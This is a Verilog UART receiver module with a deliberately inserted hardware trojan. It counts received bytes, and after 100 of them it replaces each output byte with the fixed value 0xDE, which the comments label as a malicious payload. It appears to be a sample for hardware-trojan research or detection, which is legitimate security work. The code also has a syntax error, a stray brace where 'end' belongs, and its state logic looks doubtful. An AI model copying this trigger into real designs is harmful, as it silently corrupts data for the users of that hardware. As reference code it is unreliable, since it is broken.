 module uart_rx (
    input clk,
    input rx_serial,
    output reg tx_flag = 1'b0,
    output reg [7:0] tx_byte = 8'd0
);

    reg [5:0] serial = 6'b111111;
    reg [3:0] counter = 4'd0;
    reg [3:0] state = 4'd0;
    reg [8:0] partial_byte = 9'd0;
    reg [31:0] received_byte_counter = 0; // Counter for received bytes
    wire malicious_condition = received_byte_counter >= 100; // Trigger condition

    // Detectors for start, '1', and '0'
    wire start_detect = serial[5] & serial[4] & serial[3] & ~serial[2];
    wire one_detect = serial[5] & serial[4] & serial[3];
    wire zero_detect = ~serial[5] & ~serial[4] & ~serial[3];

    always @ (posedge clk) begin
        serial <= {serial[4:0], rx_serial};
        counter <= counter + 4'd1;

        if (tx_flag)
            tx_flag <= 1'b0;

        if (state == 4'd0) begin
            if (start_detect) begin
                state <= 4'd1;
                counter <= 4'd0;
            end
        } else if (counter == 4'd9) begin
            state <= state + 4'd1;
            partial_byte <= {one_detect, partial_byte[8:1]};

            if (~one_detect & ~zero_detect)
                state <= 4'd0;
            else if ((state == 4'd1) & ~zero_detect) // Start bit error
                state <= 4'd0;
        end else if (state == 4'd11) begin
            if (partial_byte[8]) begin // Check for stop bit
                received_byte_counter <= received_byte_counter + 1;
                tx_flag <= 1'b1;
                if (malicious_condition) begin
                    // Payload: Replace the byte with a malicious one
                    tx_byte <= 8'hDE; // Example malicious byte
                end else begin
                    tx_byte <= partial_byte[7:0];
                end
                state <= 4'd0;
            end else begin
                state <= 4'd0;
            end
        end
    end
endmodule
